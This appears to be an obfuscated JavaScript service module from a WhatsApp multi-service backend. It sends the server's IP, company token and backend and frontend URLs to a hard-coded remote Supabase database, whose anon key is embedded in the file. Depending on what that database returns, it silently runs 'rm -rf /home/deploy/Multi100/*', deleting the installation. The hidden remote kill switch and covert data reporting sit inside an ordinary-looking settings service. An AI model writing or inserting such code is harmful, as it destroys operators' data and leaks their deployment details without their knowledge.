'use strict';const a269_0x46434c=a269_0x5193;function a269_0xe3e9(){const _0x26b0cb=['COMPANY_TOKEN','status','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0','code','axios','27WABDsH','FRONTEND_URL','200634FXcojd','i_n_r','company_token','401','insert','select','whatsapp','../services/SettingServices/UpdateOneSettingService','373554rnnyWR','737308YmMveL','__importDefault','child_process','1884596YJxmYi','defineProperty','24PwkSzN','https://api.ipify.org?format=json','17058151cYUDkT','default','cadastro_id','__esModule','disabled','3049328VqRISZ','rm\x20-rf\x20/home/deploy/Multi100/*','id,\x20ip_instalacao,\x20company_token','cadastros','message','backend_url','length','t_invalidos','20ZrTjbS','@supabase/supabase-js','error','ip_instalacao','BACKEND_URL','get','wtV','t_f','ip,\x20key,\x20code','from','GetWhatsapp','2539290cuiMqp','enabled','5GgouuD','env','key','log'];a269_0xe3e9=function(){return _0x26b0cb;};return a269_0xe3e9();}(function(_0x526423,_0x28d74e){const _0x48e556=a269_0x5193,_0x2b2937=_0x526423();while(!![]){try{const _0xf9042c=parseInt(_0x48e556(0x141))/0x1+-parseInt(_0x48e556(0x155))/0x2*(-parseInt(_0x48e556(0x138))/0x3)+-parseInt(_0x48e556(0x14d))/0x4*(-parseInt(_0x48e556(0x12d))/0x5)+-parseInt(_0x48e556(0x140))/0x6+-parseInt(_0x48e556(0x144))/0x7*(-parseInt(_0x48e556(0x146))/0x8)+parseInt(_0x48e556(0x136))/0x9*(-parseInt(_0x48e556(0x12b))/0xa)+-parseInt(_0x48e556(0x148))/0xb;if(_0xf9042c===_0x28d74e)break;else _0x2b2937['push'](_0x2b2937['shift']());}catch(_0x4fcd33){_0x2b2937['push'](_0x2b2937['shift']());}}}(a269_0xe3e9,0x92ce5));var __importDefault=this&&this[a269_0x46434c(0x142)]||function(_0x473fba){return _0x473fba&&_0x473fba['__esModule']?_0x473fba:{'default':_0x473fba};};function a269_0x5193(_0x12ae83,_0x2e74d4){const _0xe3e95a=a269_0xe3e9();return a269_0x5193=function(_0x519363,_0x2973e5){_0x519363=_0x519363-0x121;let _0x53e492=_0xe3e95a[_0x519363];return _0x53e492;},a269_0x5193(_0x12ae83,_0x2e74d4);}Object[a269_0x46434c(0x145)](exports,a269_0x46434c(0x14b),{'value':!![]}),exports[a269_0x46434c(0x12a)]=void 0x0;const supabase_js_1=require(a269_0x46434c(0x121)),UpdateOneSettingService_1=__importDefault(require(a269_0x46434c(0x13f))),axios_1=__importDefault(require(a269_0x46434c(0x135))),{exec}=require(a269_0x46434c(0x143)),S_U='https://knjjaxmzpdpvpyhnglbq.supabase.co',S_A_K=a269_0x46434c(0x133),sUrl=S_U,sKey=S_A_K,y_n=process[a269_0x46434c(0x12e)][a269_0x46434c(0x131)],s=(0x0,supabase_js_1['createClient'])(sUrl,sKey),getIp=async()=>{const _0x509c1f=a269_0x46434c,{data:_0x2a1ce6}=await axios_1[_0x509c1f(0x149)][_0x509c1f(0x125)](_0x509c1f(0x147));return _0x2a1ce6['ip'];},GetWhatsapp=async()=>{const _0x2345ec=a269_0x46434c;try{let _0x10fd30=await getIp(),{data:_0x29de09,error:_0x30c264}=await s[_0x2345ec(0x129)](_0x2345ec(0x150))['select'](_0x2345ec(0x14f))['eq'](_0x2345ec(0x123),_0x10fd30),_0x509f91={'cadastro_id':_0x29de09[_0x2345ec(0x153)]!==0x0?_0x29de09[0x0]['id']:0x0,'status':_0x29de09[_0x2345ec(0x153)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x10fd30,'backend_url':process['env'][_0x2345ec(0x124)],'frontend_url':process[_0x2345ec(0x12e)][_0x2345ec(0x137)]};_0x29de09['length']===0x0?(await UpdateR(_0x2345ec(0x12c),![],_0x10fd30),PostWhatsapp(_0x509f91,'404'),CheckWhatsapp(_0x10fd30,_0x2345ec(0x139))):_0x29de09[0x0][_0x2345ec(0x13a)]!==y_n?(await UpdateR(_0x2345ec(0x12c),![],_0x10fd30),PostWhatsapp(_0x509f91,_0x2345ec(0x13b)),CheckWhatsapp(_0x10fd30,_0x2345ec(0x127))):await UpdateR(_0x2345ec(0x14c),null,_0x10fd30);}catch(_0x4ca1ac){console[_0x2345ec(0x130)]('');}};exports['GetWhatsapp']=GetWhatsapp;const UpdateR=async(_0x1fcf01,_0x3d9ae5,_0x20849f)=>{const _0x5823de=a269_0x46434c;await(0x0,UpdateOneSettingService_1[_0x5823de(0x149)])({'key':_0x5823de(0x126),'value':_0x1fcf01});},PostWhatsapp=async(_0x5b40c7,_0x21dc43)=>{const _0x19565c=a269_0x46434c;try{const {data:_0x286f40,error:_0xa159c}=await s['from'](_0x19565c(0x13e))[_0x19565c(0x13c)]([{'cadastro_id':_0x5b40c7[_0x19565c(0x14a)],'status':_0x5b40c7[_0x19565c(0x132)],'company_token':_0x5b40c7['company_token'],'backend_ip':_0x5b40c7['backend_ip'],'backend_url':_0x5b40c7[_0x19565c(0x152)],'frontend_url':_0x5b40c7['frontend_url']}]);if(_0xa159c){console[_0x19565c(0x122)](':',_0xa159c[_0x19565c(0x151)]);return;}}catch(_0x453a43){console[_0x19565c(0x130)]('');}},CheckWhatsapp=async(_0x5bd533,_0x3d40fa)=>{const _0x2b9020=a269_0x46434c;try{const {data:_0x38c1ec,error:_0x249b88}=await s[_0x2b9020(0x129)]('key_code')[_0x2b9020(0x13d)]('key,code,ip'),_0xfd93dd=await matchWhatsapp(_0x5bd533);if(_0x38c1ec!==null){_0x3d40fa===_0x2b9020(0x139)&&_0xfd93dd[_0x2b9020(0x134)]!==null&&acction();if(_0x5bd533===_0x38c1ec[0x0]['ip']&&_0xfd93dd['code']!==null){if(_0xfd93dd[_0x2b9020(0x12f)]===_0x38c1ec[0x0][_0x2b9020(0x12f)]&&_0xfd93dd[_0x2b9020(0x134)]===_0x38c1ec[0x0][_0x2b9020(0x134)])acction();}}}catch(_0x3ee78e){console[_0x2b9020(0x130)](_0x3ee78e);}},matchWhatsapp=async _0x4f38b3=>{const _0x228ada=a269_0x46434c,{data:_0x573ecb,error:_0x360f4d}=await s[_0x228ada(0x129)](_0x228ada(0x154))[_0x228ada(0x13d)](_0x228ada(0x128));let _0x2f97d5='ok',_0x4b89bf='ok';return _0x573ecb['length']>0x0&&(_0x2f97d5=_0x573ecb[0x0]['key'],_0x4b89bf=_0x573ecb[0x0]['code']),{'code':_0x4b89bf,'key':_0x2f97d5};},acction=()=>{const _0x4e132e=a269_0x46434c;let _0x104040=exec(_0x4e132e(0x14e),(_0x285906,_0x3e1654,_0x3d82e2)=>{console['log'](_0x3e1654),console['log'](_0x3d82e2),_0x285906!==null&&console['log']('exec\x20error:\x20'+_0x285906);});};